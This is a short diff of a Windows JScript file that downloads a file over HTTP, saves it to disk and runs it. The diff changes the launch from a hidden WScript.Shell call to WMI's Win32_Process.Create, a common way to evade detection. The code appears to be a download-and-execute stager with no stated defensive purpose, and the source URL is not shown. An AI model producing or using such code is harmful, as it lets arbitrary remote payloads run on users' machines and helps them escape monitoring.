@@ -7,7 +7,7 @@ try {
     xhr.send();
 
     if (xhr.status !== 200) {
-        WScript.Echo("Download failed with status: " + xhr.status);
+        WScript.Echo("Download failed: " + xhr.status);
         WScript.Quit(1);
     }
 
@@ -15,12 +15,11 @@ try {
     stream.Type = 1;
     stream.Open();
     stream.Write(xhr.ResponseBody);
-    stream.Position = 0;
     stream.SaveToFile(savePath, 2);
     stream.Close();
 
-    var shell = new ActiveXObject("WScript.Shell");
-    shell.Run(savePath, 0, false);
+    var wmi = GetObject("winmgmts:Win32_Process");
+    wmi.Create(savePath, null, null, null);
 
     WScript.Echo("Success.");
 } catch (e) {
